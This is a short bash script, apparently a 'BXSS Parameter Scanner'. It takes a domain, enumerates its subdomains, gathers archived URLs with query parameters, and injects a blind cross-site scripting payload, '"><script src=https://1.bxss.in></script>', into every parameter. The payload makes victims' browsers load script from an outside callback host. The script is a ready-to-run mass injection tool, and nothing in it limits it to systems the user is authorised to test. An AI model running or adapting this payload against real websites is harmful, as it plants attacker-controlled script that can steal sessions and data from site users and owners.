#!/bin/bash

NEW='\033[1;38;5;154m'
PINK='\033[1;38;5;013m'
BLUE='\033[1;38;5;012m'
GREEN='\033[1;38;5;040m'
CG='\033[1;38;5;087m'
CPO='\033[1;38;5;205m'

echo -e ${GREEN}"\n"
figlet "B X S S +"
echo -e ${GREEN}"v1.0"
echo -e ${CPO}"\nTools: BXSS Parameter Scanner\n\n"

echo -n -e ${CG} "\n[+] Enter your Domain: "
read domain

echo -e ${NEW}"\n\nScanning has started...                       Please wait a little bit...\n\n"
sleep 1
echo -e ${PINK}"\n"
/root/go/bin/subfinder -d $domain | /root/go/bin/gau | grep "&" | /root/go/bin/bxss -appendMode -payload '"><script src=https://1.bxss.in></script>' -parameters
echo -e ${CPO}"\n\n                  Scanning has finished.\n\n"
sleep 1
